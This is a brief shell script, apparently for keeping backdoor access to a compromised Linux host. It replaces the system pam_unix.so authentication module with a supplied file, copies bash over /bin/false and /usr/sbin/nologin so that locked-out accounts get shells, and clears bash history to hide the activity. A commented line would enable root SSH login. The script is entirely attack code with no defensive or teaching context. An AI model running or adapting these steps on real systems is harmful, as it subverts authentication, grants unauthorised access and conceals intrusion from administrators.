#unchattr files


#permit root login <- do not run unless necessary. 
#echo "PermitRootLogin yes">>/etc/ssh/sshd_config

#change pam file
mv ./pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so

#change bin/false and /usr/sbin/nologin with my own bash

cp ./bash /bin/false

cp ./bash /usr/sbin/nologin

#clear bash history
history -c
